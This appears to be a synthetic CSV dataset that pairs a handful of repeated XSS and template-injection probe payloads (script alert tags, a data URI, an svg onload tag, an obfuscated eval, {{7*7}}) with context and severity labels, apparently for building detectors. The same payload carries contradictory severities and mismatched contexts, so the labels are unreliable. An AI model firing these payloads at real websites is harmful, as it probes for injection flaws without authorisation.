payload,context,severity
{{7*7}},template_injection,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,medium
{{7*7}},js_uri,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
{{7*7}},script_injection,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},attribute,high
{{7*7}},script_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
{{7*7}},template_injection,medium
{{7*7}},template_injection,medium
{{7*7}},script_injection,low
{{7*7}},template_injection,medium
{{7*7}},script_injection,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,low
{{7*7}},script_injection,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},template_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,low
{{7*7}},script_injection,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},js_uri,low
{{7*7}},template_injection,high
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},js_uri,medium
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
{{7*7}},event_handler,high
{{7*7}},script_injection,low
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,low
{{7*7}},script_injection,high
{{7*7}},template_injection,medium
{{7*7}},template_injection,high
{{7*7}},template_injection,high
{{7*7}},template_injection,low
{{7*7}},template_injection,high
{{7*7}},script_injection,low
{{7*7}},js_uri,high
{{7*7}},template_injection,low
{{7*7}},dom_sink,medium
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
<SCRIPT>alert(document.domain)</SCRIPT>,event_handler,low
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",attribute,high
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",template_injection,low
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",template_injection,low
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",dom_sink,low
"data:text/html,<script>alert(1)</script>",js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,high
"data:text/html,<script>alert(1)</script>",js_uri,high
%3Csvg/onload=alert(1)%3E,tag_injection,medium
%3Csvg/onload=alert(1)%3E,tag_injection,low
%3Csvg/onload=alert(1)%3E,tag_injection,low
%3Csvg/onload=alert(1)%3E,js_uri,medium
<script>alert(1)</script>,js_uri,high
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,low
<script>alert(1)</script>,script_injection,low
<script>alert(1)</script>,tag_injection,low
<script>alert(1)</script>,attribute_escape,high
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,low
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,low
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,medium
<script>alert(1)</script>,script_injection,high
<script>alert(1)</script>,script_injection,high
"eval(""al'+'ert(1)"")",dom_sink,low
"eval(""al'+'ert(1)"")",dom_sink,medium
"eval(""al'+'ert(1)"")",dom_sink,medium
